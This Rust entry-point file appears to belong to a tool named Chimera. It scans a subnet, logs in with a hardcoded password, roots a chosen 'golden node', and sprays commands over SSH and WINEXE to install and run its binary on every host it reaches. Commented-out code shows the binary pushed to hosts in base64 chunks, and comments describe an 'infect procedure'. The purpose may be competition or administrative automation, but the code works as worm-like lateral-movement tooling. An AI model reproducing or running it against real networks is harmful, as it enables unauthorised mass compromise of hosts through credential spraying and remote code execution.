// mod enumeration;
mod api;
// mod init;
mod net;

use std::sync::{Arc, Mutex};
// use enumeration::ping;
//use std::future::Future;
use crate::net::communicator::{Credentials, Session};
// use crate::net::spread::spreader::Spreader;
// use crate::net::spread::spreader::ConnectionPool;
use tokio::sync::watch;

use std::process::Command;

// const CHIMERA: &[u8] = include_bytes!("../bin/chimera64.zlib");

struct MemoryReport;

impl Drop for MemoryReport {
    fn drop(&mut self) {
        // Use an OS-specific command to get memory usage
        // This is an example for Linux using `ps`
        let output = Command::new("ps")
            .arg("-o")
            .arg("rss=")
            .arg("-p")
            .arg(std::process::id().to_string())
            .output()
            .expect("Failed to execute command");

        let memory_usage = String::from_utf8_lossy(&output.stdout);
        println!("Memory Usage at Exit: {} KB", memory_usage.trim());
    }
}

#[tokio::main]
async fn main() {
    // Used to represent the golden child node to host Serial Scripter
    let golden_node = Arc::new(Mutex::new(api::types::ServerNode::default()));

    let (api_key_sender, mut api_key_receiver) = watch::channel(String::new());
    let shared_api_key = Arc::new(api_key_sender);

    // Fetch srv_handle and srv from api::run_server
    let (srv, srv_handle) = api::start_server(shared_api_key.clone(), golden_node.clone()).await;

    // // Start API server in background
    tokio::spawn(srv);


    let start_tio = std::time::Instant::now();
    let mut x = crate::net::spread::spreader::Spreader::new("192.168.220", "MacCheese4Me!").await;

    x.spread().await;
    let golden_ip = golden_node.lock().unwrap().ip.to_string();

    let _ = x.root(&golden_ip).await;

    // Wait for the API key to be updated
    let mut api_key = String::new();
    while api_key.is_empty() {
        println!("Waiting for API Key...");
        api_key_receiver.changed().await.unwrap();
        api_key = api_key_receiver.borrow().clone();
    }

    let nix_cmd = format!("/tmp/chimera init -m {} -k {}", golden_ip, api_key);
    let win_cmd = format!("C:\\temp\\chimera.exe init -i {} -k {}", golden_ip, api_key);

    println!("Nix Command: {}", nix_cmd);

    x.command_spray("SSH", &nix_cmd, vec![]).await;
    x.command_spray("WINEXE", &win_cmd, vec![&golden_ip]).await;

    srv_handle.stop(true).await;
    x.close().await;
    println!("{:?}", golden_node);
    // srv_handle.stop(true).await;
    // Main loop
    // let mut spreader = net::spread::spreader::Spreader::new("MacCheese4Me!");
    // spreader.spread();

    // Scan subnet
    // batch connect to hosts
    // transfer chimera binary
    // run infect procedure of chimera
    // wait for responses on golden node
    // execute root procedure on golden node
    // wait for api key from golden node
    // distribute api key to all nodes and post inventory
    // wait for inventory from all nodes
    // done
    // Serial scripter manage api key lifetimes
    // Complex password (typables) after we confirm acess and have ssh keys
    // Encrypt database

    // // Define the chunk size in bytes
    // const CHUNK_SIZE: usize = 125 * 1024; // 100 KB

    // let mut start = 0;
    // let total_length = base64_str.len();

    // while start < total_length {
    //     let end = std::cmp::min(start + CHUNK_SIZE, total_length);
    //     let end = base64_str[..end]
    //         .char_indices()
    //         .last()
    //         .map_or(end, |(idx, _)| idx + 1);

    //     let chunk_str = &base64_str[start..end];
    //     let command = format!("echo \"{}\" >> /tmp/chimera64", chunk_str);

    //     // Assuming ssh_client is an async SSH client and properly initialized
    //     ssh_client.execute_command(&command).await.unwrap();

    //     // Print the progress
    //     println!("Transferred {} / {} bytes", end, total_length);

    //     start = end;
    // }
    // .for_each(|chunk| {
    //     let chunk_str = chunk.iter().collect::<String>();

    //     let command = format!("echo \"{}\" >> /tmp/chimera64", chunk_str);

    //     ssh_client.execute_command(&command).await.unwrap();
    // });

    // let command = format!("base64 -d /tmp/chimera64 > /tmp/chimera");
    // ssh_client.execute_command(&command).await.unwrap();

    let _memory_report = MemoryReport;
    println!("Total Elapsed Time {:?}", start_tio.elapsed());
}
